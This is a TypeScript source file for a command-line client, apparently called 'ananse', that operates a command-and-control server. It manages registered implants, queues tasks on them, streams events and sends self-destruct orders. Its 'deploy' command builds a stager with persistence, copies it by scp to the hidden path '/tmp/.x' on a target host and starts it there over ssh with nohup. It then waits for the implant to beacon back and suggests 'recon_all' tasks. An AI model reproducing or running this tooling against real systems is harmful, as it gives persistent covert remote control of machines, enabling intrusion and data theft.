import { Command } from "commander";
import picocolors from "picocolors";
import WebSocket from "ws";
import { existsSync } from "node:fs";
import { dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { C2Client, resolveClientConfig } from "./api.js";

/** Create the `ananse c2` command group with subcommands. */
export function createC2Command(): Command {
  const c2 = new Command("c2")
    .description("C2 server operations — manage implants and tasks")
    .option("--server <url>", "C2 server URL", process.env.C2_SERVER_URL)
    .option("--key <key>", "C2 API key", process.env.C2_API_KEY);

  // --- fleet ---
  c2
    .command("fleet")
    .description("List all registered implants")
    .action(async (_opts: Record<string, unknown>, cmd: Command) => {
      const global = cmd.parent?.opts() ?? {};
      const cfg = resolveClientConfig(global.server, global.key);
      const client = new C2Client(cfg);

      try {
        const summary = await client.fleet();
        console.log(picocolors.cyan(`\n  Fleet: ${summary.total} total, ${picocolors.green(String(summary.active))} active, ${picocolors.red(String(summary.dead))} dead\n`));
        for (const imp of summary.implants) {
          const color = imp.status === "active" ? picocolors.green : imp.status === "dead" ? picocolors.red : picocolors.dim;
          const seen = new Date(imp.lastSeen).toLocaleString();
          console.log(`  ${color(imp.id.padEnd(20))} ${color(imp.status.padEnd(8))} last: ${picocolors.dim(seen)}`);
        }
        if (summary.implants.length === 0) console.log("  (no implants registered)");
        console.log("");
      } catch (err) {
        console.error(picocolors.red(`\n  Error: ${(err as Error).message}\n`));
      }
    });

  // --- task group ---
  const task = new Command("task").description("Manage C2 tasks");

  task
    .command("create <implant-id> <type>")
    .description("Create a new task for an implant")
    .option("-p, --params <json>", "Task parameters as JSON string", "{}")
    .action(async (implantId: string, type: string, opts: { params?: string }, cmd: Command) => {
      const global = cmd.parent?.parent?.opts() ?? {};
      const cfg = resolveClientConfig(global.server, global.key);
      const client = new C2Client(cfg);

      try {
        const params = JSON.parse(opts.params ?? "{}");
        const task = await client.taskCreate({ implantId, type, params });
        console.log(picocolors.green(`\n  Task created: ${picocolors.white(task.taskId)}`));
        console.log(`  Type: ${type} | Status: ${task.status}\n`);
      } catch (err) {
        console.error(picocolors.red(`\n  Error: ${(err as Error).message}\n`));
      }
    });

  task
    .command("list [implant-id]")
    .description("List tasks, optionally filtered by implant")
    .action(async (implantId: string | undefined, _opts: Record<string, unknown>, cmd: Command) => {
      const global = cmd.parent?.parent?.opts() ?? {};
      const cfg = resolveClientConfig(global.server, global.key);
      const client = new C2Client(cfg);

      try {
        const tasks = await client.taskList(implantId);
        console.log(picocolors.cyan(`\n  Tasks: ${tasks.length} total\n`));
        for (const t of tasks) {
          const color = t.status === "completed" ? picocolors.green : t.status === "failed" ? picocolors.red : picocolors.yellow;
          const created = new Date(t.createdAt).toLocaleString();
          console.log(`  ${color(t.taskId.slice(0, 8))} ${t.type.padEnd(20)} ${color(t.status.padEnd(10))} ${picocolors.dim(created)}`);
        }
        if (tasks.length === 0) console.log("  (no tasks)");
        console.log("");
      } catch (err) {
        console.error(picocolors.red(`\n  Error: ${(err as Error).message}\n`));
      }
    });

  task
    .command("cancel <task-id>")
    .description("Cancel a pending task")
    .action(async (taskId: string, _opts: Record<string, unknown>, cmd: Command) => {
      const global = cmd.parent?.parent?.opts() ?? {};
      const cfg = resolveClientConfig(global.server, global.key);
      const client = new C2Client(cfg);

      try {
        const ok = await client.taskCancel(taskId);
        if (ok) {
          console.log(picocolors.green(`\n  Task ${picocolors.white(taskId.slice(0, 8))} cancelled.\n`));
        } else {
          console.log(picocolors.yellow(`\n  Task not found or already completed.\n`));
        }
      } catch (err) {
        console.error(picocolors.red(`\n  Error: ${(err as Error).message}\n`));
      }
    });

  // --- task result ---
  task
    .command("result <task-id>")
    .description("View full task result output")
    .action(async (taskId: string, _opts: Record<string, unknown>, cmd: Command) => {
      const global = cmd.parent?.parent?.opts() ?? {};
      const cfg = resolveClientConfig(global.server, global.key);
      const client = new C2Client(cfg);

      try {
        const task = await client.taskDetail(taskId);
        if (!task) {
          console.log(picocolors.yellow(`\n  Task not found.\n`));
          return;
        }

        console.log(`\n  ${picocolors.cyan("Task:")}     ${taskId}`);
        console.log(`  ${picocolors.cyan("Type:")}     ${task.type}`);
        console.log(`  ${picocolors.cyan("Status:")}   ${colorStatus(task.status)}`);
        console.log(`  ${picocolors.cyan("Created:")}  ${new Date(task.createdAt).toLocaleString()}`);
        if (task.completedAt) console.log(`  ${picocolors.cyan("Completed:")} ${new Date(task.completedAt).toLocaleString()}`);

        if (task.result) {
          console.log(`\n  ${picocolors.cyan("─".repeat(60))}`);
          if (task.result.success) {
            console.log(`  ${task.result.data}`);
          } else {
            console.log(`  ${picocolors.red(task.result.error ?? "failed with no error")}`);
            if (task.result.data) console.log(`  ${task.result.data}`);
          }
          console.log(`  ${picocolors.cyan("─".repeat(60))}\n`);
        } else {
          console.log(`\n  (no result yet)\n`);
        }
      } catch (err) {
        console.error(picocolors.red(`\n  Error: ${(err as Error).message}\n`));
      }
    });

  // --- task run (create + wait) ---
  task
    .command("run <implant-id> <type>")
    .description("Create a task and wait for its result")
    .option("-p, --params <json>", "Task parameters as JSON string", "{}")
    .option("-t, --timeout <seconds>", "Max wait time in seconds", "120")
    .option("--poll <ms>", "Poll interval in ms", "2000")
    .action(async (implantId: string, type: string, opts: { params?: string; timeout?: string; poll?: string }, cmd: Command) => {
      const global = cmd.parent?.parent?.opts() ?? {};
      const cfg = resolveClientConfig(global.server, global.key);
      const client = new C2Client(cfg);

      try {
        const params = JSON.parse(opts.params ?? "{}");
        const timeout = parseInt(opts.timeout ?? "120", 10) * 1000;
        const pollMs = parseInt(opts.poll ?? "2000", 10);

        // Create the task
        const task = await client.taskCreate({ implantId, type, params });
        console.log(picocolors.green(`\n  Task created: ${picocolors.white(task.taskId)}`));
        console.log(`  Waiting for result (timeout: ${Math.round(timeout / 1000)}s)...`);

        // Poll until completion
        const deadline = Date.now() + timeout;
        let lastStatus = task.status;

        while (Date.now() < deadline) {
          await sleep(pollMs);

          const updated = await client.taskDetail(task.taskId);
          if (!updated) {
            console.log(picocolors.yellow(`\n  Task disappeared.\n`));
            return;
          }

          if (updated.status !== lastStatus) {
            console.log(`  Status: ${colorStatus(updated.status)}`);
            lastStatus = updated.status;
          }

          if (updated.status === "completed" || updated.status === "failed") {
            // Display result
            console.log(`\n  ${picocolors.cyan("─".repeat(60))}`);
            if (updated.result) {
              if (updated.result.success) {
                console.log(`  ${updated.result.data}`);
              } else {
                console.log(`  ${picocolors.red(updated.result.error ?? "failed")}`);
                if (updated.result.data) console.log(`  ${updated.result.data}`);
              }
            } else {
              console.log(`  ${updated.status === "completed" ? "Completed" : "Failed"} (no result data)`);
            }
            console.log(`  ${picocolors.cyan("─".repeat(60))}`);
            console.log(`  ${updated.status === "completed" ? picocolors.green("✔ Done") : picocolors.red("✖ Failed")} — ${updated.completedAt ? new Date(updated.completedAt).toLocaleString() : ""}\n`);
            return;
          }
        }

        console.log(picocolors.yellow(`\n  Timed out after ${Math.round(timeout / 1000)}s. Task is still ${lastStatus}.\n`));
      } catch (err) {
        console.error(picocolors.red(`\n  Error: ${(err as Error).message}\n`));
      }
    });

  c2.addCommand(task);

  // --- deploy ---
  c2
    .command("deploy <user-host>")
    .description("Build stager, deploy to target, and wait for beacon")
    .option("--port <number>", "SSH port", "22")
    .option("--key <path>", "SSH identity file")
    .option("--remote-path <path>", "Remote path for stager", "/tmp/.x")
    .option("--build-only", "Only build, don't deploy")
    .option("--wait <seconds>", "Seconds to wait for beacon", "30")
    .action(async (userHost: string, opts: { port?: string; key?: string; remotePath?: string; buildOnly?: boolean; wait?: string }, cmd: Command) => {
      const global = cmd.parent?.opts() ?? {};
      const cfg = resolveClientConfig(global.server, global.key);
      const client = new C2Client(cfg);

      // Determine server address for the stager
      // Use --target-server if set, otherwise derive from C2_SERVER_URL
      // The target needs to reach the C2 server — default to the raw host:port
      const serverMatch = cfg.serverUrl.match(/https?:\/\/([^\/]+)/);
      const rawServer = serverMatch ? serverMatch[1] : "localhost:8443";

      console.log(`\n  ${picocolors.cyan("==>")} Building stager for ${picocolors.white(rawServer)}...`);

      // Find project root
      const projectRoot = findProjectRoot();
      if (!projectRoot) {
        console.error(picocolors.red(`\n  Error: can't find project root.\n`));
        return;
      }

      const buildScript = `${projectRoot}/scripts/build-stager.sh`;

      // Build stager with the target server address
      const { execSync } = await import("node:child_process");
      const buildArgs = [
        buildScript,
        "--server", rawServer,
        "--stager-token", cfg.apiKey, // reuse API key as stager token for simplicity
        "--implant-token", process.env.C2_IMPLANT_TOKEN || "imp-token-change-me",
        "--persist",
      ];

      try {
        execSync(buildArgs.join(" "), { stdio: "inherit", cwd: projectRoot });
      } catch {
        console.error(picocolors.red(`\n  Build failed.\n`));
        return;
      }

      if (opts.buildOnly) {
        console.log(picocolors.green(`\n  Built: /tmp/implant + /tmp/stager\n`));
        return;
      }

      // Deploy
      const sshPort = opts.port ?? "22";
      const remotePath = opts.remotePath ?? "/tmp/.x";
      const identityArg = opts.key ? `-i ${opts.key}` : "";

      console.log(`  ${picocolors.cyan("==>")} Copying stager to ${picocolors.white(userHost)}:${remotePath}...`);

      try {
        execSync(
          `scp ${identityArg} -P ${sshPort} -q /tmp/stager "${userHost}:${remotePath}"`,
          { stdio: "inherit", cwd: projectRoot, timeout: 30_000 },
        );
      } catch {
        console.error(picocolors.red(`\n  SCP failed. Check SSH credentials and target address.\n`));
        return;
      }

      console.log(`  ${picocolors.cyan("==>")} Executing stager on ${picocolors.white(userHost)}...`);

      try {
        execSync(
          `ssh ${identityArg} -p ${sshPort} "${userHost}" "chmod +x ${remotePath} && nohup ${remotePath} >/dev/null 2>&1 &"`,
          { stdio: "inherit", cwd: projectRoot, timeout: 15_000 },
        );
      } catch {
        console.error(picocolors.red(`\n  SSH execution failed.\n`));
        return;
      }

      // Wait for beacon
      const waitSecs = parseInt(opts.wait ?? "30", 10);
      console.log(`  ${picocolors.cyan("==>")} Waiting up to ${waitSecs}s for first beacon...`);

      const deadline = Date.now() + waitSecs * 1000;
      let deployed: { id: string; name: string } | null = null;

      while (Date.now() < deadline) {
        await sleep(2000);
        try {
          const fleet = await client.fleet();
          // Find the newest active implant (likely ours)
          const active = fleet.implants
            .filter((i: { status: string }) => i.status === "active")
            .sort((a: { firstSeen: string }, b: { firstSeen: string }) => new Date(b.firstSeen).getTime() - new Date(a.firstSeen).getTime());

          if (active.length > 0) {
            deployed = { id: active[0].id, name: active[0].name };
            break;
          }
        } catch {
          // Server might not be ready yet
        }
      }

      if (deployed) {
        console.log(picocolors.green(`\n  ✔ Implant ${picocolors.white(deployed.id)} checked in (active)\n`));
        console.log(`  ${picocolors.dim("Next:")}`);
        console.log(`  ${picocolors.dim("  ananse c2 task create " + deployed.id + " recon_all")}`);
        console.log(`  ${picocolors.dim("  ananse c2 task run    " + deployed.id + " recon_all")}`);
        console.log(`  ${picocolors.dim("  ananse c2 kill        " + deployed.id)}\n`);
      } else {
        console.log(picocolors.yellow(`\n  No beacon received within ${waitSecs}s.`));
        console.log(`  The stager was deployed but the implant may need more time.`);
        console.log(`  Run ${picocolors.white("ananse c2 fleet")} to check later.\n`);
      }
    });

  // --- kill ---
  c2
    .command("kill <implant-id>")
    .description("Send self-destruct command to an implant")
    .action(async (implantId: string, _opts: Record<string, unknown>, cmd: Command) => {
      const global = cmd.parent?.opts() ?? {};
      const cfg = resolveClientConfig(global.server, global.key);
      const client = new C2Client(cfg);

      try {
        const taskId = await client.implantKill(implantId);
        console.log(picocolors.red(`\n  Self-destruct queued for ${picocolors.white(implantId)}`));
        console.log(`  Task: ${taskId}\n`);
      } catch (err) {
        console.error(picocolors.red(`\n  Error: ${(err as Error).message}\n`));
      }
    });

  // --- watch ---
  c2
    .command("watch")
    .description("Live-stream implant and task events via WebSocket")
    .action(async (_opts: Record<string, unknown>, cmd: Command) => {
      const global = cmd.parent?.opts() ?? {};
      const cfg = resolveClientConfig(global.server, global.key);

      // Convert http:// to ws://, https:// to wss://
      const wsUrl = cfg.serverUrl.replace(/^http/, "ws") + "/api/v1/operator/ws";
      const ws = new WebSocket(wsUrl);

      let connected = false;

      ws.on("open", () => {
        ws.send(JSON.stringify({ token: cfg.apiKey }));
      });

      ws.on("message", (raw) => {
        const event = JSON.parse(raw.toString());
        const ts = new Date(event.timestamp).toLocaleTimeString();

        if (event.type === "auth_ok") {
          connected = true;
          console.log(picocolors.green(`\n  Connected — listening for events...\n`));
          return;
        }

        const color = eventColor(event.type);
        const icon = eventIcon(event.type);
        console.log(`  ${picocolors.dim(ts)} ${color(icon)} ${color(event.type)} ${formatEventData(event.data)}`);
      });

      ws.on("close", () => {
        if (connected) {
          console.log(picocolors.yellow(`\n  Disconnected.\n`));
        } else {
          console.error(picocolors.red(`\n  Connection failed or auth rejected.\n`));
        }
        process.exit(0);
      });

      ws.on("error", (err) => {
        console.error(picocolors.red(`\n  WebSocket error: ${err.message}\n`));
        process.exit(1);
      });

      // Handle Ctrl+C cleanly
      process.on("SIGINT", () => {
        ws.close();
      });
    });

  return c2;
}

function eventColor(type: string): (s: string) => string {
  if (type.startsWith("implant")) return picocolors.cyan;
  if (type.startsWith("task_completed")) return picocolors.green;
  if (type.startsWith("task_failed") || type.startsWith("alert")) return picocolors.red;
  if (type.startsWith("task")) return picocolors.yellow;
  return picocolors.white;
}

function eventIcon(type: string): string {
  if (type === "implant_registered") return "●";
  if (type === "implant_beacon") return "◐";
  if (type === "implant_killed") return "✕";
  if (type === "task_created") return "+";
  if (type === "task_completed") return "✔";
  if (type === "task_failed") return "✖";
  if (type === "task_cancelled") return "−";
  if (type === "alert") return "!";
  return "•";
}

function formatEventData(data: Record<string, unknown>): string {
  const parts: string[] = [];
  if (data.implantId) parts.push(String(data.implantId).slice(0, 8));
  if (data.taskId) parts.push(String(data.taskId).slice(0, 8));
  if (data.type) parts.push(String(data.type));
  if (data.success !== undefined) parts.push(data.success ? "ok" : "fail");
  if (data.error) parts.push(picocolors.red(String(data.error)));
  return parts.join(" ") || JSON.stringify(data);
}

function colorStatus(status: string): string {
  switch (status) {
    case "completed": return picocolors.green(status);
    case "failed": return picocolors.red(status);
    case "running": return picocolors.yellow(status);
    case "delivered": return picocolors.cyan(status);
    case "pending": return picocolors.dim(status);
    default: return status;
  }
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function findProjectRoot(): string | null {
  const __filename = fileURLToPath(import.meta.url);
  const __dirname = dirname(__filename);
  let dir = __dirname;
  for (let i = 0; i < 10; i++) {
    if (existsSync(`${dir}/scripts/build-stager.sh`)) return dir;
    const parent = dirname(dir);
    if (parent === dir) return null;
    dir = parent;
  }
  return null;
}
